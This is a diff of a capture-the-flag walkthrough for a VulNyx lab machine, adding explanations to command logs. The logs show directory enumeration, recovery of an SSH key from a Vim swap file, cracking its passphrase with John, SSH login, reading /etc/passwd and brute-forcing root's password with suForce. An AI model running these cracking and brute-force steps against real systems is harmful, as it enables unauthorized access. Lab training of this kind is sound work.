@@ -28,6 +28,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 56.78 seconds
 ```
+
+We use the `gobuster` command to enumerate hidden directories and files on the target web server.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ gobuster dir -x html,php,txt,bak,zip,xml,json,js,md,log,sh,css -u http://192.168.100.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -49,7 +51,9 @@ Starting gobuster in directory enumeration mode
 /index.html           (Status: 200) [Size: 10701]
 /notes.txt            (Status: 200) [Size: 101]
 ```
+An unusual `notes.txt` file has been detected and needs cheking.
 ![notes.txt](/walkthroughs/vulnyx/low-difficulty/noob/web-notes.png)
+This suggests that the user `diego` was configuring SSH, but accidentally closed the editor (may be **Vim**) without saving.
 
 The **Vim** text editor, common to Linux/UNIX systems, creates a temporary file while a document is being  edited. The temporary file has the `swp` file extension, and the name of the file is the same as the file being edited by **Vim**.
 
@@ -57,11 +61,11 @@ In this scenario, the temp file's name is `id_rs` (the default name for SSH priv
 ![id_rsa](/walkthroughs/vulnyx/low-difficulty/noob/id-rsa.png)
 
 ### Shell (diego)
-We copy and create file `id_rsa` in the Kali machine
+We copy the contents of the`id_rsa` file (we just found it) and create file `id_rsa` in the Kali machine
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ nano id_rsa             
-                                                                            
+                                                                           
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ls
 config-err-P11Xeb
@@ -74,7 +78,7 @@ systemd-private-bbfa9993931a445cadb85c3c43528c7b-polkit.service-PTDMGK
 systemd-private-bbfa9993931a445cadb85c3c43528c7b-systemd-logind.service-frRxGj
 systemd-private-bbfa9993931a445cadb85c3c43528c7b-upower.service-SeqwxM
 ```
-
+Checking the access permissions of the `id_rsa` file.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ls -la
@@ -86,11 +90,11 @@ drwxrwxrwt  2 root     root       40 Apr 18 11:12 .font-unix
 drwxrwxrwt  2 root     root       60 Apr 18 11:12 .ICE-unix
 -rw-rw-r--  1 dungcngo dungcngo 1743 Apr 20 11:13 id_rsa
 ```
-
+Currently, it allows read/write access only for the user and group, but other can read it, which is insecure. Change the permissions to `600` so only the owner can read/write.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ chmod 600 id_rsa 
-                                                                                 
+                                                                           
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ls -la
 total 16
@@ -101,7 +105,7 @@ drwxrwxrwt  2 root     root       40 Apr 18 11:12 .font-unix
 drwxrwxrwt  2 root     root       60 Apr 18 11:12 .ICE-unix
 -rw-------  1 dungcngo dungcngo 1743 Apr 20 11:13 id_rsa
 ```
-
+Convert the SSH private key file (`id_rsa`) to a hash format that **John the Ripper** can understand and use for brute-force attacks.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ssh2john id_rsa > diego.hash
@@ -110,7 +114,7 @@ drwxrwxrwt  2 root     root       60 Apr 18 11:12 .ICE-unix
 └─$ cat diego.hash      
 id_rsa:$sshng$0$8$5FB6DAB10833FB47$1192$c32c747274276c3f22ae780b2ba3b9d8296284124f4caa636d076a7c1fc06c8972042b66d000226f9123e951fd50c2b21441457a68223765a9c73def3eae91238ef404bfb60576ea84edf2346c029261e24ad590f009615dd87ecf970ff31a13ff7c13cd742c08c4f6b02c2f3acd90a0a5d313377c445e92aa30f66a66d293364c0a8a3e7581f0e3ed8f9db5225ebdec55226c3718a8b8dbbdb944fe329bcac9fbe95b58df13f95cc846161c58659488f22d8aa664312e9a17ccbb74368e2edc5e302ece06a93f5d7eb929f314b428f03ad276686660957ec58a4a06240b01972c8b04f3bb2633d02421a556bbcfd3faae86fecb39701bfedeac68c36fac20fd42700dc8cf9fe4fd98fad4d1f643175de224d1bdb04d0e1bcd2177a4303e21499a55bef9f2c4b584c2fb0bf9e908863e50d99f8c83ce20014674716231c99cfbf1663a5916afb584c73a384c88b2dd367cdfc2d10ea866d61d2e579bd79fe38655f580a1fbd0bf1af1e726826998692df590c747c198a753cc079783dcadff3c59eef55a4ae4164b8f945d9a7cb0de8584a5271793d9c27e1fd946904b1f18be09b684f8bb28ec4448aa0b4437065b03edf038b7893baaec6af6ae80e5825073ca432963ba7ffa680d3047c5e2b852bcf087880c8cb5b1b88993a6f1b79b276967c15d3203bf03259aed9abc0c00846680f163a216c30276bdc692ade995065036be442a66c1b50dfdb00e57c5fbf3f43cc50d0c3b21471f762079f38a733e00cdc78a5c43295d6fc23323389247d5b95bd6c3481d44fce4ff741309f93448040029777cafc690e53d297d2019f917c265aaac591e9624c4846a62eecf63e584af6eae1f4eccf1aadf14b8cfe075351fec63c908e7bf877a2e7739f2b4dea3d8de99d7948e186da3f3ec547e001b5bff88c6e09da55a865844a44c9ed57dbc51b0aab75350149be7cbad0e93f7e348cc746eaadb3d11750c9178e80c8b18e7a658534e2839eceebc3ce0cbf1b154d78278b0c4a3cfc863bec78e84313f76be01f132147dbac78255805e374574aa77218beb622a02399d36744cf755d925463b9cdb274f260399068064b6362907e2610914578abab06566730cccfabc9300840996661ba3e382299820e19c4e8e87cc6b17750e1c476c2fd8d8276407ad0df5f25d4122aa62318f2bb74323f2417afae9869fa9e9930378ff28111af223c99768b75531657755cbd1e95b3fc76fe8808e84067d4203654ea284ed57bef32911c3703954d879a239244d097bf02c38b4a8f2c9441c1213ec303200c02ac53e62fe62b47abba4291eab331bbc3e84e64172bc78578b6626623e0460f8b3f0e60f772c3b686f1bf2d202468611377163147e64875fcf5d639fd5395b74799813abcd829a019ab34d7c4cd3eb3799c4a5e3131247559deff7eeeb84f5d465ab0e368819ae6f70f5f38f48c16b55d359b2b66cad602e91f1bec02295773cb9bc0bcb6c779f1e010ce590bcbf8f8a83b9ec16333a0c75a7e72fa515bd794d8a6d580a59efed945871a1bb76b5959bf14851a28b01231c196c0a8f0806c44844aada7ba469b90855966d5f459a9fd3216ebf65b62a350632a0a29f19ffee8eeb63f7779796627a2e33c03921653581fa266d689eda49427a08a25be6c4ed6bb1ea49282eb46017f34028de
 ```
-
+Run the command **John the Ripper** `john` to brute-force `diego.hash` and use wordlist `rockyou.txt`. 
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt diego.hash 
@@ -125,7 +129,9 @@ sandiego         (id_rsa)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+Private key `id_rsa` has passphrase: `sandiego`.
 
+Login the target machine with username `diego` using SSH and use the private key `id_rsa` for authentication.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ ssh -i id_rsa diego@192.168.100.146  
@@ -141,6 +147,8 @@ noob
 ```
 
 ### Privilege Escalation
+#### Enumeration
+Use the command `cat /etc/password` to check the file containing information about user account on the system.
 ```bash
 diego@noob:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -170,6 +178,7 @@ sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 diego:x:1000:1000:diego,,,:/home/diego:/bin/bash
 ```
+We use `suForce` and a wordlist of the first 5000 passwords in `rockyou.txt` to brute-force user `root`'s password.
 ```bash
 diego@noob:/tmp$ ls
 rockyou5000.txt
@@ -218,6 +227,7 @@ diego@noob:/tmp$ ./suForce -u root -w rockyou5000.txt
 💥 Password | rootbeer
 ───────────────────────────────────
 ```
+User `root`'s password is `rootbeer`.
 ```bash
 diego@noob:/tmp$ su
 Contraseña: 
@@ -225,6 +235,7 @@ root@noob:/tmp# id; hostname
 uid=0(root) gid=0(root) grupos=0(root)
 noob
 ```
+#### Flags
 ```bash
 root@noob:/tmp# cd ~
 root@noob:~# find / -name root.txt -o -name user.txt | xargs cat
